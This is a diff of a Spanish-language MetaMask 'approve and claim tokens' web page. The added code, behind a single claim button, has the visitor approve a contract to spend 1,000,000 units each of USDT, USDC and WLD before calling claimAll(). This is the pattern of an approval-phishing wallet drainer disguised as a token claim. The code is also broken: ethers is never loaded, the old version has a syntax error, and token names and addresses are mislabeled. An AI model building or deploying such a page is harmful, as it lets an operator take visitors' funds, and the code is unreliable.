@@ -1,80 +1,53 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Conectar MetaMask y Aprobar Tokens</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
-</head>
-<body>
-    <button onclick="connectWallet()">Conectar MetaMask</button>
-    <button onclick="approveAndClaim()">Aprobar y Reclamar Tokens</button>
+<script>
+const provider = new ethers.providers.Web3Provider(window.ethereum);
+const signer = provider.getSigner();
+const contractAddress = "0xD949A68ACBdFC313f7d94FC9169F98DB45F5F2E4";
+const contractABI = [
+    "function claimAll() external",
+    "function approve(address spender, uint256 amount) external returns (bool)"
+];
+
+const usdtAddress = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58";
+const usdcAddress = "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1";
+const wldAddress = "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85";
+const spenderAddress = contractAddress;
+const approveAmount = ethers.utils.parseUnits("1000000", 6);
+
+async function approveAndClaim() {
+    if (!window.ethereum) {
+        alert("MetaMask no está instalado");
+        return;
+    }
     
-    <script>
-        const contractAddress = "0x579d705fE8bA250eDA39aa51E6443AD971112686"; // Reemplaza con la dirección real del contrato
-        const tokenAddress = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-"0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
-"0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"; // Reemplaza con la dirección del token
-        const contractABI = [
-            {
-                "constant": false,
-                "inputs": [],
-                "name": "claimAll",
-                "outputs": [],
-                "type": "function"
-            }
-        ];
-        const tokenABI = [
-            {
-                "constant": false,
-                "inputs": [
-                    {"name": "spender", "type": "address"},
-                    {"name": "amount", "type": "uint256"}
-                ],
-                "name": "approve",
-                "outputs": [],
-                "type": "function"
-            }
-        ];
+    await provider.send("eth_requestAccounts", []);
+    const contract = new ethers.Contract(contractAddress, contractABI, signer);
+    const usdtContract = new ethers.Contract(usdtAddress, contractABI, signer);
+    const usdcContract = new ethers.Contract(usdcAddress, contractABI, signer);
+    const wldContract = new ethers.Contract(wldAddress, contractABI, signer);
+    
+    try {
+        console.log("Aprobando USDT...");
+        await usdtContract.approve(spenderAddress, approveAmount);
+        console.log("Aprobación de USDT completada");
         
-        let web3;
-        let contract;
-        let tokenContract;
-        let userAccount;
-        const approveAmount = web3.utils.toWei("100", "ether"); // Ajusta la cantidad a aprobar
+        console.log("Aprobando USDC...");
+        await usdcContract.approve(spenderAddress, approveAmount);
+        console.log("Aprobación de USDC completada");
+        
+        console.log("Aprobando WLD...");
+        await wldContract.approve(spenderAddress, approveAmount);
+        console.log("Aprobación de WLD completada");
+        
+        console.log("Llamando a claimAll...");
+        const tx = await contract.claimAll();
+        await tx.wait();
+        console.log("Tokens reclamados correctamente");
+        alert("Tokens aprobados y reclamados correctamente");
+    } catch (error) {
+        console.error("Error en la transacción", error);
+        alert("Error en la transacción");
+    }
+}
+</script>
 
-        async function connectWallet() {
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-                await window.ethereum.request({ method: "eth_requestAccounts" });
-                const accounts = await web3.eth.getAccounts();
-                userAccount = accounts[0];
-                contract = new web3.eth.Contract(contractABI, contractAddress);
-                tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
-                console.log("Conectado: ", userAccount);
-            } else {
-                alert("Instala MetaMask para continuar");
-            }
-        }
-
-        async function approveAndClaim() {
-            if (!userAccount) {
-                alert("Conecta tu wallet primero");
-                return;
-            }
-            try {
-                // Aprobar tokens
-                await tokenContract.methods.approve(contractAddress, approveAmount).send({ from: userAccount });
-                console.log("Tokens aprobados");
-                
-                // Reclamar tokens
-                await contract.methods.claimAll().send({ from: userAccount });
-                alert("Tokens aprobados y reclamados exitosamente");
-            } catch (error) {
-                console.error("Error en la transacción: ", error);
-                alert("Error en la transacción");
-            }
-        }
-    </script>
-</body>
-</html>
+<button onclick="approveAndClaim()">Aprobar y Reclamar Tokens</button>
